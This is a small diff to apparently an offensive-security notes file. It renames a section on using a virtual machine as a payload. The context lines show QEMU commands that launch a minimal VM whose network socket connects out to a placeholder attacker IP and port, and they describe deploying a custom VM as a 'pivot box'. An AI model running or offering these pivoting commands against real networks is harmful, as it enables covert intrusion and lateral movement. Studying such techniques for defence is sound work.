@@ -46,7 +46,7 @@ C:\> .\qemu-system-i386.exe -m 1M -netdev socket,id=sock,connect=<attacker_IP>:<
 C:\> .\qemu-system-x86_64.exe -m 1M -netdev socket,id=sock,connect=<attacker_IP>:<attacker_PORT> -device e1000,netdev=sock,mac=52:54:00:65:43:21 -nographic
 ```
 
-## Virtual Machine as a Payload
+## Bring Your Own Island (Virtual Machine as a Payload)
 
 Deploy your own custom virtual machine as a pivot box.
 
